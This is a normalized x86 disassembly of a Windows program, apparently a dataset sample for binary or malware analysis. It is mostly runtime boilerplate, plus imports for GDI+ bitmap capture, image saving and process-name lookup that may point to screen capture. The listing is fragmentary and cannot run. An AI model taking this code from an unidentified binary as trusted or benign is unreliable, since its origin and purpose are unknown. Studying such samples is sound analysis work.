mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_42cb84
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42ccdc
mov eax [ ebp - 0x1c ]
sub_42cce4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_41a7eb
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_401000
mov [ ecx ] r--data
jmp sub_419ff3
sub_401040
retn
sub_401070
xor eax eax
retn 0x4
sub_4010d6
lea ecx [ ebp - 0x1c ]
call sub_419ff3
mov eax sub_4010e4
retn
sub_4010e4
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_401155
lea ecx [ ebp - 0x1c ]
call sub_419ff3
mov eax sub_401163
retn
sub_401163
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_401180
mov eax ecx
cmp [ eax + 0x14 ] 0x8
jb r-xdata
retn
mov eax [ eax ]
sub_401190
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_401260
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x8
mov [ ecx + 0x10 ] eax
jb r-xdata
mov [ ecx + eax * 2 ] dx
pop ebp
retn 0x4
mov ecx [ ecx ]
sub_4019f0
push ebp
mov ebp esp
mov edx [ ecx + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_4021e0
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x8
call sub_4039d0
pop ebp
retn 0x4
sub_40264b
mov ecx [ ebp - 0x14 ]
call sub_402660
push 0x0
push 0x0
call sub_41ac98
int3
sub_402df0
mov [ ecx ] r--data
retn
sub_402e00
mov ax [ ecx + 0x4 ]
retn
sub_402e10
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] ax
pop ebp
retn 0x4
sub_402ea2
lea ecx [ ebp - 0x1c ]
call sub_419ff3
mov eax sub_402eb0
retn
sub_402eb0
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_402ed0
xor eax eax
retn
sub_402ee0
mov eax [ ecx + 0x54 ]
retn
sub_402ef0
mov eax [ ecx + 0x58 ]
retn
sub_402f00
mov ecx [ ecx + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
jmp edx
sub_402f20
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
push eax
call sub_41a7eb
push esi
call sub_41a0d6
add esp 0x8
sub_402f40
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
sub_4047cf
lea ecx [ ebp - 0x38 ]
call sub_419ff3
mov eax sub_4047dd
retn
sub_4047dd
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_404a01
mov ecx [ ebp - 0x14 ]
push ecx
call sub_41a0d6
add esp 0x4
push 0x0
push 0x0
call sub_41ac98
int3
sub_404d83
mov eax [ ebp - 0x14 ]
push eax
call sub_41a0d6
add esp 0x4
push 0x0
push 0x0
call sub_41ac98
int3
sub_405d9f
mov eax [ ebp - 0x14 ]
push eax
call sub_41a0d6
add esp 0x4
push 0x0
push 0x0
call sub_41ac98
int3
sub_406f30
push esi
mov esi ecx
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_4085d0
push esi
mov esi ecx
call sub_406e00
test eax eax
jne r-xdata
pop esi
retn
mov ecx esi
pop esi
jmp sub_407ea0
sub_409f20
xor eax eax
push esi
mov esi ecx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
call sub_409b30
mov eax esi
pop esi
retn
sub_40a030
mov [ ecx ] r--data
retn
sub_40a100
push ecx
mov [ ecx ] r--data
call sub_419c87
pop ecx
retn
sub_40a110
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_40a120
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_40a1b0
mov eax [ ecx ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_40a210
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_4195ac
add esp 0x8
pop ebp
retn 0x4
sub_40a260
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_419cc5
add esp 0x8
pop ebp
retn 0x4
sub_40a2b0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40a2f0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
j_sub_419ff3#2
jmp sub_419ff3
sub_40a4a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40a670
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_41a7eb
add esp 0x4
sub_40a710
add ecx 0x4
jmp sub_419e08
sub_40a720
add ecx 0x4
jmp sub_419e11
sub_40a730
or eax 0xffffffff
retn 0x4
sub_40a740
xor eax eax
xor edx edx
retn
sub_40a750
or eax 0xffffffff
retn
sub_40a760
mov eax ecx
retn 0xc
sub_40a770
retn 0x4
sub_40a780
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x30 ]
mov eax [ ecx ]
cdq
retn
sub_40a7a0
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x34 ]
mov eax [ ecx ]
cdq
retn
sub_40b308
mov ecx [ ebp - 0x18 ]
call sub_40b1b0
push 0x0
push 0x0
call sub_41ac98
int3
sub_40be50
mov al [ ecx + 0xc ]
retn
sub_40be60
mov al [ ecx + 0xd ]
retn
sub_40bec0
push esi
lea esi [ ecx + 0x60 ]
mov ecx esi
call sub_40b560
push esi
mov [ esi ] r--data
call sub_419c87
add esp 0x4
pop esi
retn
sub_40bfc3
mov eax r-xdata
retn
sub_410330
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_40f870
xor eax eax
pop ebp
retn 0x4
sub_4104f0
push esi
mov esi ecx
call sub_410390
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
pop esi
retn
sub_410b51
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_410b6a
lea ecx [ ebp - 0x1c ]
call sub_419ff3
mov eax sub_410b78
retn
sub_410b78
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_410b90
push 0xffffffff
call [ Sleep@IAT ]
xor eax eax
retn
sub_410c10
push esi
mov esi ecx
call sub_410ba0
mov eax [ esi ]
push eax
call sub_41a0d6
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_411370
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x40 ] eax
pop ebp
retn 0x4
sub_4115c1
mov edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x30 ]
call sub_41a01c
push r--data
lea eax [ ebp - 0x30 ]
push eax
call sub_41ac98
int3
j_sub_4124d0
jmp sub_4124d0
sub_412970
mov eax ecx
mov [ eax ] 0x0
retn
sub_4129c0
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
call sub_41a7eb
pop ecx
sub_412e00
mov eax [ ecx + 0xc ]
push eax
call sub_41a0d6
pop ecx
retn
sub_412e10
xor eax eax
cmp [ ecx + 0x34 ] eax
sete al
retn
sub_4130fb
mov eax [ ebp + 0x8 ]
push eax
call sub_41a0d6
add esp 0x4
push 0x0
push 0x0
call sub_41ac98
int3
sub_416500
mov [ ecx ] r--data
retn
sub_418e50
mov eax ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
retn
sub_41948e
lea ecx [ ebp - 0x20 ]
call sub_419ff3
mov eax sub_41949c
retn
j_sub_419ff3
jmp sub_419ff3
sub_4194c9
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_419516
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_419563
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4195a1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41ac18
sub_419719
mov edi edi
push esi
call sub_41c203
mov esi [ eax + 0x8 ]
call sub_41c1dd
mov edx eax
mov eax esi
pop esi
retn
sub_4197b1
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_419ea2
pop ecx
sub_4197c8
mov ecx [ ecx + 0x4 ]
call sub_409ff0
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_419854
mov eax [ rw-data ]
retn
sub_419b85
mov eax [ ecx + 0x4 ]
retn
sub_419b89
mov eax [ ecx + 0x8 ]
retn
sub_419b8d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_419ba1
mov eax rw-data
retn
sub_419df1
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_419e82
push [ esi ]
call sub_41a0d6
pop ecx
pop ecx
pop esi
retn
sub_419e08
push [ ecx ]
call sub_419e92
pop ecx
retn
sub_419e11
push [ ecx ]
call sub_419ea2
pop ecx
retn
j_sub_41d4bc
jmp sub_41d4bc
sub_419e5f
push r-xdata
call sub_41b488
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_419e72
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_419e82
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_419e92
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_419ea2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_419ee4
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_419f0f
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_419f2c
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_419f79
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_41a7eb
pop ecx
sub_419ff3
mov [ ecx ] r--data
jmp sub_419f79
sub_41a068
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41a085
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_41e0c2
pop ecx
retn
sub_41a0d6
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41a7eb
sub_41a7c1
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_41e301
push 0x1
push 0x0
call sub_41e042
add esp 0xc
jmp sub_41e00f
call eax
sub_41ace4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_41a0d6
sub_41af6d
call sub_41e872
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_41f64a
sub_41b0db
mov eax sub_421065
mov [ rw-data ] eax
mov [ rw-data ] sub_42075b
mov [ rw-data ] sub_42070f
mov [ rw-data ] sub_420748
mov [ rw-data ] sub_4206b1
mov [ rw-data ] eax
mov [ rw-data ] sub_420fdd
mov [ rw-data ] sub_4206cd
mov [ rw-data ] sub_42062f
mov [ rw-data ] sub_4205bb
retn
sub_41b13b
mov edi edi
push ebp
mov ebp esp
call sub_41b0db
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_4210ab
sub_41b214
mov edi edi
push ebp
mov ebp esp
call sub_41e7f9
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
int3
push eax
call sub_41e9bb
pop ecx
sub_41b233
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41b332
mov edi edi
push ebp
mov ebp esp
call sub_41e872
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_41b344
call sub_41e872
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_41b482
call sub_41f0eb
retn
sub_41b488
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_41b44c
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_41b7ff
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b72e
add esp 0x14
pop ebp
retn
sub_41b974
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_4210d3
pop ecx
pop ecx
retn
sub_41b988
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_41f35d
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_421265
retn
push eax
call sub_41f338
_start
call sub_42336a
jmp sub_41b845
sub_41bc90
call sub_41e872
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_41f64a
sub_41c1dd
call sub_41e872
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_41f64a
sub_41c203
call sub_41e872
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_41f64a
sub_41c3fc
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_41c4e3
push 0xd
call sub_4250f6
pop ecx
retn
sub_41c4ef
push 0xc
call sub_4250f6
pop ecx
retn
sub_41d0d1
push 0xc
call sub_4250f6
pop ecx
retn
sub_41d0dd
push 0xc
call sub_4250f6
pop ecx
retn
sub_41d10e
and [ esi + 0x70 ] 0xffffffef
retn
sub_41d39b
push [ ebp - 0x14 ]
call sub_41d2ce
pop ecx
retn
sub_41d3df
call sub_41e872
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_41e872
dec [ eax + 0x90 ]
sub_41d481
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_41d48a
mov esp [ ebp - 0x18 ]
call sub_41eba4
sub_41d4bc
call sub_41e872
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_41d548
push 0x4
mov eax sub_42f23b
call sub_41c3c6
call sub_41e872
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41ebdd
call sub_41ebf0
sub_41d621
mov eax [ ebp - 0x14 ]
call sub_41d3f9
retn
sub_41d898
xor eax eax
inc eax
retn
sub_41d89c
mov esp [ ebp - 0x18 ]
call sub_41eba4
sub_41d931
xor eax eax
inc eax
retn
sub_41d935
mov esp [ ebp - 0x18 ]
call sub_41eba4
sub_41de28
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_41a01c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_41e129
push 0xe
call sub_4250f6
pop ecx
retn
sub_41e2cb
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_41e695
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41e6a4
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_41e6cb
call [ TlsAlloc@IAT ]
retn 0x4
sub_41e7e7
push 0xd
call sub_4250f6
pop ecx
retn
sub_41e7f0
push 0xc
call sub_4250f6
pop ecx
retn
sub_41e9a6
push 0xd
call sub_4250f6
pop ecx
retn
sub_41e9b2
push 0xc
call sub_4250f6
pop ecx
retn
sub_41eba4
push 0x8
push r--data
call sub_421220
call sub_41e872
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_41e00f
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_41ebc4
xor eax eax
inc eax
retn
sub_41ebdd
call sub_41e872
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_41eba4
call eax
sub_41ebf0
push 0x8
push r--data
call sub_421220
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_41eba4
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_41ec14
xor eax eax
inc eax
retn
sub_41ec28
push sub_41eba4
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_41ed92
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41ee4b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_41f0ca
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_41f09f
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_41f0e2
push 0x8
call sub_4251cf
pop ecx
retn
sub_41f0eb
push 0x8
call sub_4250f6
pop ecx
retn
sub_41f30d
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_4250f6
pop ecx
sub_41f322
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_41f1e2
add esp 0xc
pop ebp
retn
sub_41f338
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_41f1e2
add esp 0xc
pop ebp
retn
sub_41f34e
push 0x1
push 0x0
push 0x0
call sub_41f1e2
add esp 0xc
retn
sub_41f35d
push 0x1
push 0x1
push 0x0
call sub_41f1e2
add esp 0xc
retn
sub_41f36c
mov edi edi
push ebp
mov ebp esp
call sub_41e4b0
push [ ebp + 0x8 ]
call sub_41e301
pop ecx
push 0xff
call sub_41f338
int3
sub_41f6b7
push 0xc
call sub_4250f6
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_42070f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4206cd
add esp 0x10
pop ebp
retn
sub_420748
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4205bb
pop ecx
pop ecx
pop ebp
retn
sub_42075b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_42062f
pop ecx
pop ecx
pop ebp
retn
sub_421265
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_422ca4
push sub_422c62
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_4236c3
push 0xd
call sub_4250f6
pop ecx
retn
sub_423a92
push 0xd
call sub_4250f6
pop ecx
retn
sub_423acb
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_423931
pop ecx
mov [ rw-data ] 0x1
sub_423af0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_429d40
sub_423b06
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_429d40
sub_425052
xor eax eax
retn
sub_4250f6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4251c6
push 0xa
call sub_4250f6
pop ecx
retn
sub_427040
mov eax rw-data
retn
sub_427046
mov eax rw-data
retn
sub_42704c
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_4270f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_42714a
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_4272be
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_4250f6
pop ecx
sub_4273d6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_427300
add esp 0xc
pop ebp
retn 0x4
sub_427409
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_427915
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_42743b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_427300
add esp 0xc
pop ebp
retn 0x8
sub_4278e9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_427820
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_427934
call eax
retn
sub_427937
and [ rw-data ] 0x0
retn
sub_427a5b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_427bf1
push [ ebp + 0x8 ]
call sub_42a184
pop ecx
retn
sub_4283c4
push ebx
call sub_42a184
pop ecx
retn
sub_428522
call sub_42a413
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_41a7eb
pop ecx
retn
call sub_42a1ed
sub_428646
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_428806
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_4287ce
pop ecx
pop ecx
pop ebp
retn
sub_4299af
push 0x2
call sub_41f36c
sub_429cb4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_429b9e
add esp 0x10
pop ebp
retn
sub_429d21
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_429cce
add esp 0x10
pop ebp
retn
sub_429eab
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_42a647
add esp 0xc
pop ebp
retn
sub_42a17b
push 0xa
call sub_4250f6
pop ecx
retn
sub_42a280
push 0x1
call sub_4250f6
pop ecx
retn
sub_42a3db
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_4285f1
pop ecx
pop ecx
retn
sub_42a40a
push 0x1
call sub_4250f6
pop ecx
retn
sub_42a413
push 0x1
call sub_42a339
pop ecx
retn
sub_42c701
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_42c720
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_42c810
push esi
call sub_4285b5
pop ecx
retn
sub_42c8e9
push ebx
call sub_42a184
pop ecx
retn
sub_42cb02
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_42ccdc
push ebx
call sub_42a184
pop ecx
retn
GdipFree
jmp [ GdipFree@IAT ]
GdipAlloc
jmp [ GdipAlloc@IAT ]
GdipDisposeImage
jmp [ GdipDisposeImage@IAT ]
GdipSaveImageToStream
jmp [ GdipSaveImageToStream@IAT ]
GdipCreateBitmapFromHBITMAP
jmp [ GdipCreateBitmapFromHBITMAP@IAT ]
GdipGetImageEncodersSize
jmp [ GdipGetImageEncodersSize@IAT ]
GdipGetImageEncoders
jmp [ GdipGetImageEncoders@IAT ]
GdipCloneImage
jmp [ GdipCloneImage@IAT ]
GdiplusShutdown
jmp [ GdiplusShutdown@IAT ]
GdiplusStartup
jmp [ GdiplusStartup@IAT ]
GetProcessImageFileNameW
jmp [ GetProcessImageFileNameW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_42cd60
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cd80
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cda0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cdc0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42cde0
lea ecx [ ebp - 0x20 ]
jmp sub_412e20
sub_42cde8
lea ecx [ ebp - 0x28 ]
jmp sub_412e20
sub_42cdf0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_41ac09
mov eax r--data
jmp sub_41a8b2
sub_42ce10
